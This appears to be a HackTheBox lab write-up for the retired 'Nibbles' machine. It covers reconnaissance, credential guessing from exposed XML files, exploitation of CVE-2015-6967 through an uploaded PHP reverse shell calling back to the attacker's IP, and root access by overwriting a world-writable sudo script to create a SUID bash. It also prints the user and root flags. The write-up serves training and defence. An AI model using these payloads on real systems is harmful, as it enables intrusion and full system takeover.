# Nibbles — HackTheBox

| Field | Details |
|-------|---------|
| Platform | HackTheBox |
| Machine | Nibbles |
| OS | Linux (Ubuntu 16.04 LTS) |
| Difficulty | Easy |
| Attacker IP | `10.10.16.36` |
| Target IP | `10.129.88.191` |
| Tools Used | Nmap, gobuster, curl, netcat, Python pty |
| CVEs | CVE-2015-6967 (Nibbleblog ≤ 4.0.4 My Image plugin unrestricted PHP file upload RCE) |
| Date | October 2026 |

---

## Table of Contents

- [Attack Chain Summary](#attack-chain-summary)
- [Reconnaissance](#reconnaissance)
- [Web Enumeration](#web-enumeration)
- [Foothold — CVE-2015-6967 Nibbleblog Unrestricted File Upload](#foothold--cve-2015-6967-nibbleblog-unrestricted-file-upload)
- [Privilege Escalation — Sudo Writable Script + SUID Bash](#privilege-escalation--sudo-writable-script--suid-bash)
- [Flags](#flags)
- [Lessons Learned](#lessons-learned)
- [Full Attack Chain Reference](#full-attack-chain-reference)
- [Commands Reference](#commands-reference)
- [MITRE ATT\&CK Mapping](#mitre-attck-mapping)

---

## Attack Chain Summary

| Step | Technique | Outcome |
|------|-----------|----------|
| 1 | Nmap — full port + service-version scan | Ports 22 (SSH), 80 (HTTP/Apache) discovered |
| 2 | HTTP page source review — HTML comment | Hidden directory `/nibbleblog/` revealed |
| 3 | Gobuster directory brute-force on `/nibbleblog/` | `admin.php`, `README`, `content/`, `config.xml`, `users.xml` discovered |
| 4 | Nibbleblog version fingerprint — `README` | Nibbleblog 4.0.3 confirmed — CVE-2015-6967 applicable |
| 5 | `config.xml` + `users.xml` enumeration | Username `admin` confirmed; password inferred: `admin:nibbles` |
| 6 | Admin panel login at `/nibbleblog/admin.php` | Authenticated as `admin` |
| 7 | CVE-2015-6967 — My Image plugin unrestricted PHP upload | PHP reverse shell uploaded; shell spawned as `nibbler` |
| 8 | Shell stabilisation + user flag | `user.txt` captured |
| 9 | `sudo -l` enumeration | `nibbler` can run `/home/nibbler/personal/stuff/monitor.sh` as root with no password |
| 10 | `personal.zip` unzipped | `monitor.sh` is world-writable (`-rwxrwxrwx`) |
| 11 | SUID bash copy technique — overwrite `monitor.sh` | `/bin/bash` copied to `/tmp/rb` with SUID bit set |
| 12 | `sudo monitor.sh` → `/tmp/rb -p` | Root shell via SUID bash; `root.txt` captured |

---

## Reconnaissance

### Step 1 — Full TCP Port Scan

```bash
Hackerpatel007_1@htb[/htb]$ sudo nmap -Pn --open -p- -T4 10.129.88.191
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Only two ports open — SSH and HTTP. Everything runs through port 80.

---

### Step 2 — Service Version Detection

```bash
Hackerpatel007_1@htb[/htb]$ sudo nmap -sS -sV -sC -T4 -O -p 22,80 -Pn 10.129.88.191 -oA Nibbles
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
```

| Port | Service | Notes |
|------|---------|-------|
| 22 | OpenSSH 7.2p2 | Ubuntu 16.04 |
| 80 | Apache 2.4.18 | No page title — near-blank root page, real app likely at a sub-path |

---

## Web Enumeration

### Step 3 — HTTP Source Code Review

```bash
Hackerpatel007_1@htb[/htb]$ curl -s http://10.129.88.191/ | cat
```

```html
<b>Hello world!</b>

<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

An HTML comment discloses the `/nibbleblog/` path. The dismissive "Nothing interesting here!" is the developer's mistake — it is immediately interesting.

> **Key concept:** Always view the full page source of every HTTP response before running tools. HTML comments, hidden `<input>` fields, and `<link>` tags frequently contain path disclosures, version strings, and developer notes that never appear in the rendered browser output.

---

### Step 4 — Directory Brute-Force on /nibbleblog/

```bash
Hackerpatel007_1@htb[/htb]$ gobuster dir \
  -u http://10.129.88.191/nibbleblog/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html -t 50
```

```
/admin.php     (Status: 200) [Size: 1401]
/content       (Status: 301)
/update.php    (Status: 200) [Size: 1622]
/README        (Status: 200) [Size: 4628]
/plugins       (Status: 301)
```

Priority targets: `/admin.php` (login panel), `/README` (version string), `/content/` (config files).

---

### Step 5 — Version Fingerprinting and Credential Discovery

```bash
Hackerpatel007_1@htb[/htb]$ curl -s http://10.129.88.191/nibbleblog/README | head -10
```

```
Version: v4.0.3
Codename: Coffee
```

**Nibbleblog 4.0.3 confirmed** — vulnerable to CVE-2015-6967 (requires authenticated admin).

Nibbleblog stores configuration in XML files accessible without authentication:

```bash
Hackerpatel007_1@htb[/htb]$ curl -s http://10.129.88.191/nibbleblog/content/private/config.xml
```

```xml
<name type="string">Nibbles</name>
<notification_email_to type="string">admin@nibbles.com</notification_email_to>
```

```bash
Hackerpatel007_1@htb[/htb]$ curl -s http://10.129.88.191/nibbleblog/content/private/users.xml
```

```xml
<user username="admin">
  <session_fail_count type="integer">0</session_fail_count>
</user>
```

**Username confirmed: `admin`**

The site is called "Nibbles", the email uses `nibbles.com`, and the machine name is Nibbles. Applying the machine name as the password yields `admin:nibbles`.

> **Note:** Nibbleblog's login implements a brute-force blacklist that locks the IP after a small number of failed attempts. Dictionary attacks will result in lockout. Informed credential guessing from `config.xml` context is the correct approach.

---

## Foothold — CVE-2015-6967 Nibbleblog Unrestricted File Upload

### Step 6 — Admin Panel Login

Authenticate at `http://10.129.88.191/nibbleblog/admin.php` with `admin:nibbles`. Dashboard loads successfully.

---

### Step 7 — CVE-2015-6967: My Image Plugin PHP Shell Upload

**The vulnerability:** CVE-2015-6967 is an unrestricted file upload in the **My Image plugin** of Nibbleblog ≤ 4.0.4. The upload handler performs no extension or MIME type validation — it accepts any file, including `.php`. The uploaded file is stored at a predictable, web-accessible path:

```
/nibbleblog/content/private/plugins/my_image/image.php
```

Apache processes `.php` files in the webroot as PHP — giving direct code execution.

**PHP reverse shell payload:**

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.36/9001 0>&1'"); ?>
```

**Upload via the UI:** Plugins → My Image → Configure → upload `shell.php`. Nibbleblog shows a warning about invalid image data — **ignore it**. The file is saved despite the warning because the plugin does not abort on content validation failure.

**Start the listener and trigger:**

```bash
Hackerpatel007_1@htb[/htb]$ nc -lvnp 9001
Hackerpatel007_1@htb[/htb]$ curl -s http://10.129.88.191/nibbleblog/content/private/plugins/my_image/image.php
```

```
connect to [10.10.16.36] from (UNKNOWN) [10.129.88.191] 58234
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$
```

---

### Step 8 — Shell Stabilisation

```bash
nibbler@Nibbles:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
Hackerpatel007_1@htb[/htb]$ stty raw -echo; fg
nibbler@Nibbles:~$ export TERM=xterm
```

---

## User Flag

```bash
nibbler@Nibbles:~$ cat /home/nibbler/user.txt
83d6ba055f2b13eeebf22de2a6c13099
```

---

## Privilege Escalation — Sudo Writable Script + SUID Bash

### Step 9 — Sudo Enumeration

```bash
nibbler@Nibbles:~$ sudo -l
```

```
User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

The rule looks restrictive — only one specific script. The critical question: **what are the permissions on `monitor.sh`?** If `nibbler` can write to it, the restriction is meaningless.

---

### Step 10 — Examining monitor.sh

```bash
nibbler@Nibbles:~$ unzip personal.zip
# Creates personal/stuff/monitor.sh

nibbler@Nibbles:~$ ls -la personal/stuff/monitor.sh
-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
```

**`-rwxrwxrwx`** — world-writable. The script was archived with `777` permissions. `nibbler` can overwrite its contents with any code, and the sudoers rule will execute that code as root with no password.

| Bit Set | Meaning |
|---------|----------|
| Owner `rwx` | nibbler can read, write, execute |
| Group `rwx` | Any group member can read, write, execute |
| Other `rwx` | **Every user** can read, write, and execute |

---

### Step 11 — Overwriting monitor.sh with SUID Bash Payload

**The SUID bash copy technique:**
1. Copy `/bin/bash` to `/tmp/rb`
2. Set the SUID bit (`chmod u+s /tmp/rb`) — the binary now runs with root’s effective UID
3. Execute via sudo
4. Run `/tmp/rb -p` — the `-p` flag opts out of bash’s privilege-drop protection

```bash
nibbler@Nibbles:~$ echo -e '#!/bin/bash\ncp /bin/bash /tmp/rb; chmod u+s /tmp/rb' > /home/nibbler/personal/stuff/monitor.sh
nibbler@Nibbles:~$ chmod +x /home/nibbler/personal/stuff/monitor.sh

nibbler@Nibbles:~$ sudo /home/nibbler/personal/stuff/monitor.sh

nibbler@Nibbles:~$ ls -la /tmp/rb
-rwsr-xr-x 1 root root 1037528 Oct 25 22:31 /tmp/rb
```

The `s` in `-rwsr-xr-x` confirms the SUID bit is set and the owner is `root`.

---

### Step 12 — Root Shell via SUID Bash

```bash
nibbler@Nibbles:~$ /tmp/rb -p

rb-4.3# id
uid=1001(nibbler) gid=1001(nibbler) euid=0(root) groups=1001(nibbler)

rb-4.3# cat /root/root.txt
55e6969578ad1f26f28450d2542275f7
```

**`euid=0(root)`** — effective UID is root. The `-p` flag is essential: without it, bash detects the real/effective UID mismatch and drops back to `nibbler`. With `-p`, bash honours the SUID bit and retains root effective privileges.

---

## Flags

| Flag | Value |
|------|-------|
| User Flag | `83d6ba055f2b13eeebf22de2a6c13099` |
| Root Flag | `55e6969578ad1f26f28450d2542275f7` |

---

## Lessons Learned

1. **HTML source code review is non-negotiable and must happen before any tool is run.** The entire attack chain was gated on a single HTML comment. No gobuster scan of the root path would have found `/nibbleblog/` — it was disclosed only in the page source. `curl -s <url> | cat` costs thirty seconds and regularly changes the entire engagement direction.

2. **Unauthenticated access to XML configuration files is a high-value finding.** `config.xml` and `users.xml` were accessible without authentication and disclosed the admin username, site name (which was the password), and admin email. Always browse application data directories for exposed XML, JSON, YAML, and `.env` files.

3. **CVE-2015-6967 is a two-step attack: credential recovery first, then exploitation.** The CVE requires authenticated admin access, making credential discovery the actual attack. When a CVE lists “authentication required,” the next question is always: “how hard is it to get those credentials?” Here, the answer was “read the page source and the config file.”

4. **File extension and MIME type validation must be enforced server-side on every upload endpoint.** The My Image plugin accepted `.php` files with no restriction. Server-side validation must whitelist acceptable extensions, verify MIME type from the actual file bytes (not the `Content-Type` header), and store uploads outside the webroot or in a no-execute directory. Any one of these three controls stops this attack.

5. **`sudo -l` is the first command to run after getting a shell, every time, without exception.** The output was immediate and conclusive. The rule `(root) NOPASSWD: /path/to/script` looks restrictive but only is if the script is non-writable. Sudo misconfigurations are among the most common privilege escalation paths in assessments.

6. **A sudoers rule that permits a writable script is functionally equivalent to `NOPASSWD: /bin/bash`.** The rule `(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh` failed entirely because `monitor.sh` had `777` permissions. The security of a sudo rule on a script depends on the script’s permissions and every directory in its path. Any writable link in that chain defeats the restriction. Document this as **sudo misconfiguration — writable script** at critical severity.

7. **The SUID bash copy is a clean, reliable, reversible privesc payload for sudo script abuse.** Copy bash with SUID set, run with `-p` to retain effective root UID. The `-p` flag is not optional — without it, bash’s privilege-drop protection resets the effective UID back to the real user.

8. **World-writable files under sudo control are a critical finding pattern.** Any script or binary that (a) is executable by a privileged process and (b) is writable by a lower-privileged account is a direct privilege escalation path. Always manually review every file referenced in `sudo -l` output.

---

## Full Attack Chain Reference

```
[Attacker: 10.10.16.36]
        ↓
Nmap: ports 22 (SSH), 80 (HTTP/Apache 2.4.18) open
        ↓
curl http://10.129.88.191/ — page source reveals:
<!-- /nibbleblog/ directory. Nothing interesting here! -->
        ↓
gobuster on /nibbleblog/: admin.php, README, content/, config.xml, users.xml
        ↓
README: Nibbleblog v4.0.3 "Coffee" — CVE-2015-6967 applicable
        ↓
config.xml: site name "Nibbles", email admin@nibbles.com
users.xml: username = admin
        ↓
Credential inference: admin:nibbles → admin.php login confirmed
        ↓
CVE-2015-6967: My Image plugin → upload shell.php
Upload path: /nibbleblog/content/private/plugins/my_image/image.php
        ↓
nc -lvnp 9001 → curl image.php → reverse shell as nibbler
[User Flag: 83d6ba055f2b13eeebf22de2a6c13099]
        ↓
sudo -l: (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
        ↓
unzip personal.zip → monitor.sh permissions: -rwxrwxrwx (world-writable!)
        ↓
echo '#!/bin/bash\ncp /bin/bash /tmp/rb; chmod u+s /tmp/rb' > monitor.sh
        ↓
sudo /home/nibbler/personal/stuff/monitor.sh
        ↓
/tmp/rb -p → euid=0(root)
[Root Flag: 55e6969578ad1f26f28450d2542275f7]
```

---

## Commands Reference

| Command | Purpose |
|---------|---------|
| `sudo nmap -Pn --open -p- -T4 10.129.88.191` | Full TCP port scan |
| `sudo nmap -sS -sV -sC -T4 -O -p 22,80 -Pn 10.129.88.191 -oA Nibbles` | Service version + OS detection |
| `curl -s http://10.129.88.191/` | Retrieve HTTP root — read HTML comments in source |
| `gobuster dir -u http://10.129.88.191/nibbleblog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html -t 50` | Directory brute-force on /nibbleblog/ |
| `curl -s http://10.129.88.191/nibbleblog/README` | Read README for version fingerprint |
| `curl -s http://10.129.88.191/nibbleblog/content/private/config.xml` | Read config — site name, email |
| `curl -s http://10.129.88.191/nibbleblog/content/private/users.xml` | Confirm admin username |
| `nc -lvnp 9001` | Start reverse shell listener |
| `curl -s http://10.129.88.191/nibbleblog/content/private/plugins/my_image/image.php` | Trigger uploaded PHP shell |
| `python3 -c 'import pty;pty.spawn("/bin/bash")'` | Upgrade to interactive PTY |
| `stty raw -echo; fg` | Fully stabilise shell |
| `sudo -l` | Enumerate sudo privileges |
| `unzip personal.zip` | Extract archive containing monitor.sh |
| `ls -la personal/stuff/monitor.sh` | Verify world-writable permissions |
| `echo -e '#!/bin/bash\ncp /bin/bash /tmp/rb; chmod u+s /tmp/rb' > /home/nibbler/personal/stuff/monitor.sh` | Overwrite monitor.sh with SUID bash payload |
| `sudo /home/nibbler/personal/stuff/monitor.sh` | Execute payload as root via sudo |
| `ls -la /tmp/rb` | Verify SUID bit set |
| `/tmp/rb -p` | Spawn SUID root shell (euid=0) |

---

## MITRE ATT&CK Mapping

| Technique | Sub-Technique | Description |
|-----------|---------------|--------------|
| T1595 | T1595.001 | Nmap full-port and service-version scan |
| T1083 | — | Gobuster directory brute-force on `/nibbleblog/` |
| T1552 | T1552.001 | Admin username from `users.xml`; password inferred from `config.xml` — `admin:nibbles` |
| T1190 | — | CVE-2015-6967: Nibbleblog 4.0.3 My Image plugin unrestricted PHP upload — authenticated RCE |
| T1505 | T1505.003 | PHP reverse shell uploaded to `/nibbleblog/content/private/plugins/my_image/image.php` |
| T1059 | T1059.004 | Bash reverse shell via PHP `exec()` |
| T1548 | T1548.003 | `sudo -l` reveals `(root) NOPASSWD: monitor.sh`; world-writable script overwritten |
| T1574 | T1574.006 | `monitor.sh` overwritten with SUID bash copy payload; sudo executes as root |
| T1548 | T1548.001 | `/bin/bash` copied to `/tmp/rb` with SUID bit; `/tmp/rb -p` spawns root euid shell |

*HackTheBox retired machine — writeup published after official retirement.*  
*Penetration Tester role in India | Target: January 2027*
